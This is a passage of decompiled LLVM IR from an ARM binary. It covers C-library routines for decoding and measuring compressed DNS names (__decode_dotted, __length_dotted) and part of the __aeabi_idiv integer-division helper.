  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 (i8*)* @strlen, { 7, 21, 20, 6, 5, 11, 10, 9, 22, 19, 18, 17, 15, 16, 14, 13, 12, 8, 25, 24, 23, 4, 3, 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 5, 0, 4, 8, 7, 6, 3, 2, 1 }
  uselistorder i32 46, { 0, 3, 4, 1, 2 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_17344, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17338, { 1, 0 }
  uselistorder label %dec_label_pc_172ec, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_17360 = load i32, i32* @r4, align 4
  %v6_17360 = load i32, i32* @r5, align 4
  %v0_17364 = load i32, i32* @r0, align 4
  store i32 %v0_17364, i32* %sl.global-to-local, align 4
  %v2_17364 = icmp eq i32 %v0_17364, 0
  br i1 %v2_17364, label %.thread16, label %dec_label_pc_17404.preheader

.thread16:                                        ; preds = %entry
  %v0_173701 = load i32, i32* @r2, align 4
  store i32 %v0_173701, i32* %sb.global-to-local, align 4
  %v0_173742 = load i32, i32* @r3, align 4
  store i32 %v0_173742, i32* %stack_var_-40, align 4
  br label %dec_label_pc_17424

dec_label_pc_17404.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_17370 = load i32, i32* @r2, align 4
  store i32 %v0_17370, i32* %sb.global-to-local, align 4
  %v0_17374 = load i32, i32* @r3, align 4
  store i32 %v0_17374, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_174043952 = load i32, i32* @r1, align 4
  %v2_174044053 = add i32 %v1_174043952, %v0_17364
  %v3_174044154 = inttoptr i32 %v2_174044053 to i8*
  %v4_174044255 = load i8, i8* %v3_174044154, align 1
  %v6_174044356 = zext i8 %v4_174044255 to i32
  store i32 %v6_174044356, i32* @r4, align 4
  %v2_174084457 = icmp eq i8 %v4_174044255, 0
  br i1 %v2_174084457, label %bb35, label %dec_label_pc_17388.lr.ph

dec_label_pc_17388:                               ; preds = %dec_label_pc_17388.lr.ph, %bb30
  %v2_1741050 = phi i1 [ %v2_174104663, %dec_label_pc_17388.lr.ph ], [ true, %bb30 ]
  %v6_1740448 = phi i32 [ %v6_174044361, %dec_label_pc_17388.lr.ph ], [ %v6_17404, %bb30 ]
  %v1_1740447 = phi i32 [ %v1_174043960, %dec_label_pc_17388.lr.ph ], [ %v5_173b0, %bb30 ]
  %v1_1738c = and i32 %v6_1740448, 192
  br i1 %v2_1741050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_17388
  %v1_17390 = load i32, i32* %r8.global-to-local, align 4
  %v2_17390 = add i32 %v1_17390, 1
  store i32 %v2_17390, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_17388, %bb
  %v2_17394 = icmp eq i32 %v1_1738c, 192
  %v1_17398 = add i32 %v1_1740447, 1
  store i32 %v1_17398, i32* @r5, align 4
  br i1 %v2_17394, label %dec_label_pc_173a0, label %dec_label_pc_173c0

dec_label_pc_173a0:                               ; preds = %bb28
  %v2_173a0 = add i32 %v1_17398, %v0_173a0.ph59
  %v3_173a0 = inttoptr i32 %v2_173a0 to i8*
  %v4_173a0 = load i8, i8* %v3_173a0, align 1
  %v6_173a0 = zext i8 %v4_173a0 to i32
  %v1_173a8 = urem i32 %v6_1740448, 64
  br i1 %v2_1741050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_173a0
  %v1_173ac = load i32, i32* %r8.global-to-local, align 4
  %v2_173ac = add i32 %v1_173ac, 1
  store i32 %v2_173ac, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_173a0, %bb29
  %v4_173b0 = mul nuw nsw i32 %v1_173a8, 256
  %v5_173b0 = or i32 %v6_173a0, %v4_173b0
  store i32 %v5_173b0, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_17404 = add i32 %v5_173b0, %v0_173a0.ph59
  %v3_17404 = inttoptr i32 %v2_17404 to i8*
  %v4_17404 = load i8, i8* %v3_17404, align 1
  %v6_17404 = zext i8 %v4_17404 to i32
  store i32 %v6_17404, i32* @r4, align 4
  %v2_17408 = icmp eq i8 %v4_17404, 0
  br i1 %v2_17408, label %dec_label_pc_17410.bb36_crit_edge, label %dec_label_pc_17388

dec_label_pc_173c0:                               ; preds = %bb28
  %v2_173c0 = add i32 %v6_1740448, %storemerge17.ph58
  store i32 %v2_173c0, i32* %r6.global-to-local, align 4
  %v2_173c4 = load i32, i32* %stack_var_-40, align 4
  %v1_173c8 = add i32 %v2_173c0, 1
  store i32 %v1_173c8, i32* %r7.global-to-local, align 4
  %v3_173cc = icmp ult i32 %v1_173c8, %v2_173c4
  br i1 %v3_173cc, label %dec_label_pc_173d4, label %dec_label_pc_17424

dec_label_pc_173d4:                               ; preds = %dec_label_pc_173c0
  %v2_173d4 = add i32 %v1_17398, %v0_173a0.ph59
  store i32 %v2_173d4, i32* @r1, align 4
  %v0_173d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_173d8 = add i32 %v0_173d8, %storemerge17.ph58
  store i32 %v2_173d8, i32* @r0, align 4
  store i32 %v6_1740448, i32* @r2, align 4
  %v0_173e0 = call i32 @memcpy()
  %v0_173e4 = load i32, i32* @r5, align 4
  %v1_173e4 = load i32, i32* @r4, align 4
  %v2_173e4 = add i32 %v1_173e4, %v0_173e4
  store i32 %v2_173e4, i32* %r1.global-to-local, align 4
  %v0_173e8 = load i32, i32* %sl.global-to-local, align 4
  %v2_173e8 = add i32 %v0_173e8, %v2_173e4
  %v3_173e8 = inttoptr i32 %v2_173e8 to i8*
  %v4_173e8 = load i8, i8* %v3_173e8, align 1
  %v0_173ec = load i32, i32* %fp.global-to-local, align 4
  %v2_173ec = icmp eq i32 %v0_173ec, 0
  br i1 %v2_173ec, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_173d4
  %v1_173f0 = load i32, i32* %r8.global-to-local, align 4
  %v3_173f0 = add i32 %v1_173f0, %v1_173e4
  store i32 %v3_173f0, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_173d4, %bb31
  %v2_173f4 = icmp eq i8 %v4_173e8, 0
  br i1 %v2_173f4, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_173fc.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_173fc = load i32, i32* %sb.global-to-local, align 4
  %v3_173fc = load i32, i32* %r6.global-to-local, align 4
  %v4_173fc = add i32 %v3_173fc, %v2_173fc
  %v5_173fc = inttoptr i32 %v4_173fc to i8*
  store i8 %v0_173fc.off0, i8* %v5_173fc, align 1
  %v0_17400.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_17404.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17410.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1740439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1740440 = add i32 %v1_1740439, %v0_17404.pre.pre
  %v3_1740441 = inttoptr i32 %v2_1740440 to i8*
  %v4_1740442 = load i8, i8* %v3_1740441, align 1
  %v6_1740443 = zext i8 %v4_1740442 to i32
  store i32 %v6_1740443, i32* @r4, align 4
  %v2_1740844 = icmp eq i8 %v4_1740442, 0
  %v2_1741046 = icmp eq i32 %v0_17410.pre.pre, 0
  br i1 %v2_1740844, label %dec_label_pc_17410, label %dec_label_pc_17388.lr.ph

dec_label_pc_17388.lr.ph:                         ; preds = %dec_label_pc_17404.preheader, %bb34
  %v2_174104663 = phi i1 [ %v2_1741046, %bb34 ], [ false, %dec_label_pc_17404.preheader ]
  %v6_174044361 = phi i32 [ %v6_1740443, %bb34 ], [ %v6_174044356, %dec_label_pc_17404.preheader ]
  %v1_174043960 = phi i32 [ %v1_1740439, %bb34 ], [ %v1_174043952, %dec_label_pc_17404.preheader ]
  %v0_173a0.ph59 = phi i32 [ %v0_17404.pre.pre, %bb34 ], [ %v0_17364, %dec_label_pc_17404.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_17400.pre, %bb34 ], [ 0, %dec_label_pc_17404.preheader ]
  br label %dec_label_pc_17388

dec_label_pc_17410:                               ; preds = %bb34
  br i1 %v2_1741046, label %dec_label_pc_17410.bb36_crit_edge, label %bb35

dec_label_pc_17410.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_17410
  %v0_17418.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17424

bb35:                                             ; preds = %dec_label_pc_17404.preheader, %dec_label_pc_17410
  %v1_17414 = load i32, i32* %r8.global-to-local, align 4
  %v2_17414 = add i32 %v1_17414, 1
  store i32 %v2_17414, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17424

dec_label_pc_17424:                               ; preds = %dec_label_pc_173c0, %bb35, %dec_label_pc_17410.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_17418.pre, %dec_label_pc_17410.bb36_crit_edge ], [ %v2_17414, %bb35 ], [ -1, %dec_label_pc_173c0 ]
  store i32 %v3_17360, i32* @r4, align 4
  store i32 %v6_17360, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_173a0.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_17404, { 1, 0 }
  uselistorder i32 %v5_173b0, { 0, 2, 1 }
  uselistorder i32 %v6_1740448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1741050, { 1, 0 }
  uselistorder i32 %v0_17364, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 11, 10, 19, 9, 8, 7, 6, 2, 17, 16, 1, 0, 18, 5, 15, 14, 13, 20, 12, 4, 3 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 13 }
  uselistorder label %dec_label_pc_17424, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_17410.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17388.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_17430 = load i32, i32* @r0, align 4
  store i32 %v0_17430, i32* @lr, align 4
  %v2_17430 = icmp eq i32 %v0_17430, 0
  br i1 %v2_17430, label %bb, label %dec_label_pc_17448

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_17440:                               ; preds = %dec_label_pc_17450
  %v1_17440 = add i32 %v1_17458, 2
  br label %dec_label_pc_17470

dec_label_pc_17448:                               ; preds = %entry
  %v0_17448 = load i32, i32* @r1, align 4
  br label %dec_label_pc_17458

dec_label_pc_17450:                               ; preds = %dec_label_pc_17458
  %v1_17464 = and i32 %v6_17458, 192
  %v2_17468 = add i32 %v6_17458, %v1_1745c
  %v2_17450 = icmp eq i32 %v1_17464, 192
  br i1 %v2_17450, label %dec_label_pc_17440, label %dec_label_pc_17458

dec_label_pc_17458:                               ; preds = %dec_label_pc_17450, %dec_label_pc_17448
  %v1_17458 = phi i32 [ %v2_17468, %dec_label_pc_17450 ], [ %v0_17448, %dec_label_pc_17448 ]
  %v2_17458 = add i32 %v1_17458, %v0_17430
  %v3_17458 = inttoptr i32 %v2_17458 to i8*
  %v4_17458 = load i8, i8* %v3_17458, align 1
  %v6_17458 = zext i8 %v4_17458 to i32
  %v1_1745c = add i32 %v1_17458, 1
  %v2_17460 = icmp eq i8 %v4_17458, 0
  br i1 %v2_17460, label %dec_label_pc_17470, label %dec_label_pc_17450

dec_label_pc_17470:                               ; preds = %dec_label_pc_17458, %dec_label_pc_17440
  %v1_17470 = phi i32 [ %v1_17440, %dec_label_pc_17440 ], [ %v1_1745c, %dec_label_pc_17458 ]
  %v2_17470 = sub i32 %v1_17470, %v0_17448
  ret i32 %v2_17470

; uselistorder directives
  uselistorder i32 %v6_17458, { 1, 0 }
  uselistorder i32 %v1_17458, { 2, 1, 0 }
  uselistorder i32 %v0_17430, { 0, 2, 1 }
  uselistorder i8 0, { 64, 16, 24, 25, 65, 15, 21, 66, 46, 70, 68, 45, 69, 67, 44, 39, 8, 9, 71, 72, 76, 77, 23, 60, 61, 73, 74, 75, 14, 78, 40, 47, 80, 79, 48, 41, 81, 82, 83, 84, 85, 86, 10, 51, 90, 0, 88, 87, 49, 1, 89, 50, 2, 91, 92, 26, 3, 94, 93, 52, 95, 96, 97, 98, 42, 99, 101, 102, 100, 11, 12, 13, 103, 4, 27, 104, 17, 105, 106, 18, 62, 28, 29, 5, 107, 108, 109, 111, 112, 113, 114, 110, 43, 115, 116, 117, 118, 119, 19, 30, 31, 32, 33, 34, 35, 22, 6, 7, 121, 120, 36, 122, 123, 37, 124, 53, 20, 125, 126, 127, 128, 130, 54, 131, 132, 129, 133, 134, 135, 136, 138, 137, 139, 63, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 150, 152, 55, 154, 153, 38, 155, 56, 156, 158, 159, 157, 57, 160, 161, 59, 162, 58, 163, 164, 165, 166, 167, 168, 169 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 3 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17478 = icmp slt i32 %arg2, 0
  %v2_17478 = icmp eq i32 %arg2, 0
  %v0_1747c = load i32, i32* @r0, align 4
  %v2_1747c = xor i32 %v0_1747c, %arg2
  br i1 %v2_17478, label %dec_label_pc_17590, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %entry
  br i1 %v1_17478, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_17484
  %v2_17484 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_17484, %bb
  %v1_17550 = phi i32 [ %v2_17484, %bb ], [ %arg2, %dec_label_pc_17484 ]
  %v1_17488 = add i32 %v1_17550, -1
  %v7_17488 = icmp eq i32 %v1_17550, 1
  br i1 %v7_17488, label %dec_label_pc_17530, label %dec_label_pc_17490

dec_label_pc_17490:                               ; preds = %thread-pre-split
  %v1_17490 = icmp slt i32 %v0_1747c, 0
  br i1 %v1_17490, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_17490
  %v2_17494 = sub i32 0, %v0_1747c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_17490, %bb85
  %v0_17584 = phi i32 [ %v0_1747c, %dec_label_pc_17490 ], [ %v2_17494, %bb85 ]
  %v3_17498 = icmp uge i32 %v0_17584, %v1_17550
  %v9_17498 = icmp eq i32 %v0_17584, %v1_17550
  %v2_1749c = xor i1 %v3_17498, true
  %v3_1749c = or i1 %v9_17498, %v2_1749c
  br i1 %v3_1749c, label %dec_label_pc_1753c, label %dec_label_pc_174a0

dec_label_pc_174a0:                               ; preds = %bb86
  %v2_174a0 = and i32 %v1_17488, %v1_17550
  %v4_174a0 = icmp eq i32 %v2_174a0, 0
  br i1 %v4_174a0, label %dec_label_pc_1754c, label %dec_label_pc_174a8

dec_label_pc_174a8:                               ; preds = %dec_label_pc_174a0
  %v3_174a8 = icmp ult i32 %v1_17550, 536870912
  br i1 %v3_174a8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_174a8
  %v4_174ac = mul i32 %v1_17550, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_174a8, %.thread
  %v0_174cc.pr40.ph = phi i32 [ %v4_174ac, %.thread ], [ %v1_17550, %dec_label_pc_174a8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_174a8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_174cc.pr40 = phi i32 [ %v4_174c0, %bb89 ], [ %v0_174cc.pr40.ph, %.preheader.preheader ]
  %v1_174c4 = phi i32 [ %v4_174c4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_174b8 = icmp ugt i32 %v0_174cc.pr40, 268435455
  br i1 %v2_174b8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_174ccthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_174bc = icmp ult i32 %v0_174cc.pr40, %v0_17584
  br i1 %v4_174bc, label %bb88, label %dec_label_pc_174ccthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_174c0 = and i32 %v0_174cc.pr40, 268435456
  %v3_174c0 = icmp eq i32 %v2_174c0, 0
  %v4_174c0 = mul i32 %v0_174cc.pr40, 16
  br i1 %v3_174c0, label %bb89, label %dec_label_pc_174cc.loopexit

bb89:                                             ; preds = %bb88
  %v2_174c4 = and i32 %v1_174c4, 268435456
  %v3_174c4 = icmp eq i32 %v2_174c4, 0
  %v4_174c4 = mul i32 %v1_174c4, 16
  br i1 %v3_174c4, label %.preheader, label %dec_label_pc_174ccthread-pre-split.loopexit.loopexit

dec_label_pc_174ccthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_174d852.ph = phi i32 [ %v1_174c4, %bb87 ], [ %v4_174c4, %bb89 ]
  %v0_174cc.pr42.ph = phi i32 [ %v0_174cc.pr40, %bb87 ], [ %v4_174c0, %bb89 ]
  br label %dec_label_pc_174ccthread-pre-split.loopexit

dec_label_pc_174ccthread-pre-split.loopexit:      ; preds = %dec_label_pc_174ccthread-pre-split.loopexit.loopexit, %.thread3
  %v1_174d852 = phi i32 [ %v1_174c4, %.thread3 ], [ %v1_174d852.ph, %dec_label_pc_174ccthread-pre-split.loopexit.loopexit ]
  %v0_174cc.pr42 = phi i32 [ %v0_174cc.pr40, %.thread3 ], [ %v0_174cc.pr42.ph, %dec_label_pc_174ccthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_174ccthread-pre-split

dec_label_pc_174ccthread-pre-split:               ; preds = %dec_label_pc_174ccthread-pre-split.loopexit, %bb91
  %v1_174d850 = phi i32 [ %v1_174d852, %dec_label_pc_174ccthread-pre-split.loopexit ], [ %v3_174d8, %bb91 ]
  %v2_174d048 = phi i32 [ %v0_17584, %dec_label_pc_174ccthread-pre-split.loopexit ], [ %v2_174d0, %bb91 ]
  %v0_174cc.pr = phi i32 [ %v0_174cc.pr42, %dec_label_pc_174ccthread-pre-split.loopexit ], [ %v3_174d4, %bb91 ]
  br label %dec_label_pc_174cc

dec_label_pc_174cc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_174cc

dec_label_pc_174cc:                               ; preds = %dec_label_pc_174cc.loopexit, %dec_label_pc_174ccthread-pre-split
  %v1_174d8 = phi i32 [ %v1_174d850, %dec_label_pc_174ccthread-pre-split ], [ %v1_174c4, %dec_label_pc_174cc.loopexit ]
  %v2_174d0 = phi i32 [ %v2_174d048, %dec_label_pc_174ccthread-pre-split ], [ %v0_17584, %dec_label_pc_174cc.loopexit ]
  %v1_174d4 = phi i32 [ %v0_174cc.pr, %dec_label_pc_174ccthread-pre-split ], [ %v4_174c0, %dec_label_pc_174cc.loopexit ]
  %v2_174cc = icmp slt i32 %v1_174d4, 0
  br i1 %v2_174cc, label %dec_label_pc_174e0, label %bb90

bb90:                                             ; preds = %dec_label_pc_174cc
  %v4_174d0 = icmp ult i32 %v1_174d4, %v2_174d0
  br i1 %v4_174d0, label %bb91, label %dec_label_pc_174e0

bb91:                                             ; preds = %bb90
  %v3_174d4 = mul i32 %v1_174d4, 2
  %v2_174d8 = icmp slt i32 %v1_174d8, 0
  %v3_174d8 = mul i32 %v1_174d8, 2
  br i1 %v2_174d8, label %dec_label_pc_174e0, label %dec_label_pc_174ccthread-pre-split

dec_label_pc_174e0:                               ; preds = %bb90, %dec_label_pc_174cc, %bb91
  %v2_174ec63 = phi i32 [ %v3_174d8, %bb91 ], [ %v1_174d8, %bb90 ], [ %v1_174d8, %dec_label_pc_174cc ]
  %v1_174e455 = phi i32 [ %v3_174d4, %bb91 ], [ %v1_174d4, %bb90 ], [ %v1_174d4, %dec_label_pc_174cc ]
  br label %dec_label_pc_174e4

dec_label_pc_174e4:                               ; preds = %.thread13, %dec_label_pc_174e0
  %v1_17518 = phi i32 [ %v4_17518, %.thread13 ], [ %v2_174ec63, %dec_label_pc_174e0 ]
  %v1_174ec = phi i32 [ %v1_17528, %.thread13 ], [ 0, %dec_label_pc_174e0 ]
  %v1_1751c = phi i32 [ %v4_1751c, %.thread13 ], [ %v1_174e455, %dec_label_pc_174e0 ]
  %v1_174e8 = phi i32 [ %v0_17514, %.thread13 ], [ %v0_17584, %dec_label_pc_174e0 ]
  %v3_174e4 = icmp ult i32 %v1_174e8, %v1_1751c
  br i1 %v3_174e4, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_174e4
  %v3_174e8 = sub i32 %v1_174e8, %v1_1751c
  %v3_174ec = or i32 %v1_174ec, %v1_17518
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_174e4, %bb92
  %v1_174f4 = phi i32 [ %v1_174e8, %dec_label_pc_174e4 ], [ %v3_174e8, %bb92 ]
  %v1_174f8 = phi i32 [ %v1_174ec, %dec_label_pc_174e4 ], [ %v3_174ec, %bb92 ]
  %v4_174f0 = udiv i32 %v1_1751c, 2
  %v6_174f0 = icmp ult i32 %v1_174f4, %v4_174f0
  br i1 %v6_174f0, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_174f4 = urem i32 %v1_1751c, 2
  %v4_174f4 = icmp eq i32 %v3_174f4, 0
  %v6_174f4 = sub i32 %v1_174f4, %v4_174f0
  br i1 %v4_174f4, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_174f8 = udiv i32 %v1_17518, 2
  %v6_174f8 = or i32 %v1_174f8, %v5_174f8
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_17500 = phi i32 [ %v6_174f4, %bb93 ], [ %v1_174f4, %.thread8 ], [ %v6_174f4, %bb94 ]
  %v1_17504 = phi i32 [ %v1_174f8, %bb93 ], [ %v1_174f8, %.thread8 ], [ %v6_174f8, %bb94 ]
  %v4_174fc = udiv i32 %v1_1751c, 4
  %v6_174fc = icmp ult i32 %v1_17500, %v4_174fc
  br i1 %v6_174fc, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_17500 = and i32 %v1_1751c, 2
  %v4_17500 = icmp eq i32 %v3_17500, 0
  %v6_17500 = sub i32 %v1_17500, %v4_174fc
  br i1 %v4_17500, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_17504 = udiv i32 %v1_17518, 4
  %v6_17504 = or i32 %v1_17504, %v5_17504
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1750c = phi i32 [ %v6_17500, %bb95 ], [ %v1_17500, %.thread9 ], [ %v6_17500, %bb96 ]
  %v1_17510 = phi i32 [ %v1_17504, %bb95 ], [ %v1_17504, %.thread9 ], [ %v6_17504, %bb96 ]
  %v4_17508 = udiv i32 %v1_1751c, 8
  %v6_17508 = icmp ult i32 %v1_1750c, %v4_17508
  br i1 %v6_17508, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1750c = and i32 %v1_1751c, 4
  %v4_1750c = icmp eq i32 %v3_1750c, 0
  %v6_1750c = sub i32 %v1_1750c, %v4_17508
  br i1 %v4_1750c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_17510 = udiv i32 %v1_17518, 8
  %v6_17510 = or i32 %v1_17510, %v5_17510
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_17528 = phi i32 [ %v1_17510, %bb97 ], [ %v1_17510, %.thread10 ], [ %v6_17510, %bb98 ]
  %v0_17514 = phi i32 [ %v6_1750c, %bb97 ], [ %v1_1750c, %.thread10 ], [ %v6_1750c, %bb98 ]
  %v2_17514 = icmp eq i32 %v0_17514, 0
  br i1 %v2_17514, label %dec_label_pc_17524, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_17518, 16
  br i1 %tmp, label %dec_label_pc_17524, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_17518 = udiv i32 %v1_17518, 16
  %v4_1751c = udiv i32 %v1_1751c, 16
  br label %dec_label_pc_174e4

dec_label_pc_17524:                               ; preds = %thread-pre-split12, %bb99
  %v1_17524 = icmp slt i32 %v2_1747c, 0
  br i1 %v1_17524, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_17524
  %v2_17528 = sub i32 0, %v1_17528
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_17530, %dec_label_pc_17524, %bb100
  %v1_1752c = phi i32 [ %v1_17528, %dec_label_pc_17524 ], [ %v2_17528, %bb100 ], [ %v0_1747c, %dec_label_pc_17530 ], [ %v2_17534, %bb101 ], [ %v1_1754880, %bb103 ], [ %v2_17544, %bb104 ]
  ret i32 %v1_1752c

dec_label_pc_17530:                               ; preds = %thread-pre-split
  br i1 %v1_17478, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_17530
  %v2_17534 = sub i32 0, %v0_1747c
  br label %.thread16

dec_label_pc_1753c:                               ; preds = %bb86
  br i1 %v3_17498, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1753c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1753c, %bb102
  %v1_1754880 = phi i32 [ %v0_1747c, %dec_label_pc_1753c ], [ 0, %bb102 ]
  br i1 %v9_17498, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_17540 = ashr i32 %v2_1747c, 31
  %v2_17544 = or i32 %v4_17540, 1
  br label %.thread16

dec_label_pc_1754c:                               ; preds = %dec_label_pc_174a0
  %v2_1754c = icmp ugt i32 %v1_17550, 65535
  br i1 %v2_1754c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1754c
  %v2_17550 = and i32 %v1_17550, 32768
  %v3_17550 = icmp eq i32 %v2_17550, 0
  %v4_17550 = udiv i32 %v1_17550, 65536
  br i1 %v3_17550, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1754c
  %v0_1755c70 = phi i32 [ %v1_17550, %dec_label_pc_1754c ], [ %v4_17550, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_17560 = phi i32 [ %v0_1755c70, %.thread19 ], [ %v4_17550, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1755c = icmp ugt i32 %v1_17560, 255
  br i1 %v2_1755c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_17560 = and i32 %v1_17560, 128
  %v3_17560 = icmp eq i32 %v2_17560, 0
  %v4_17560 = udiv i32 %v1_17560, 256
  br i1 %v3_17560, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_17564 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_17570 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_17564, %bb108 ]
  %v1_1756c = phi i32 [ %v1_17560, %bb106 ], [ %v4_17560, %bb107 ], [ %v4_17560, %bb108 ]
  %v2_17568 = icmp ugt i32 %v1_1756c, 15
  br i1 %v2_17568, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1756c = and i32 %v1_1756c, 8
  %v3_1756c = icmp eq i32 %v2_1756c, 0
  %v4_1756c = udiv i32 %v1_1756c, 16
  br i1 %v3_1756c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_17570 = add nsw i32 %v1_17570, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_17578 = phi i32 [ %v1_17570, %.thread20 ], [ %v1_17570, %bb109 ], [ %v2_17570, %bb110 ]
  %v5_1757c = phi i32 [ %v1_1756c, %.thread20 ], [ %v4_1756c, %bb109 ], [ %v4_1756c, %bb110 ]
  %v2_17574 = icmp ugt i32 %v5_1757c, 3
